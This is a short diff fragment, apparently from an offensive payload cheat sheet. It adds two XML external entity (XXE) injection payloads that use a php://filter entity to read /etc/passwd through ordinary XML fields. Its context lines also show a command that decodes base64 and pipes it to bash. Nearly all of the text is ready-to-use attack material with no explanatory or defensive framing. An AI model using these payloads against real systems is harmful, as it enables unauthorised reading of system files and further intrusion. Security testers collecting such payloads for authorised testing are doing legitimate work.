@@ -1105,6 +1105,25 @@ echo {BASE64} | base64 -d | bash
 <email>&test;</email>
 </root>
 
+#EXAMPLE
+
+#Extra
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<comment>
+  <name>&xxe;</name>
+  <author>test</author>
+  <com>test</com>
+</comment>
+
+#Extra
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<data>
+  <name>&xxe;</name>
+</data>
 
 #INDEX
 
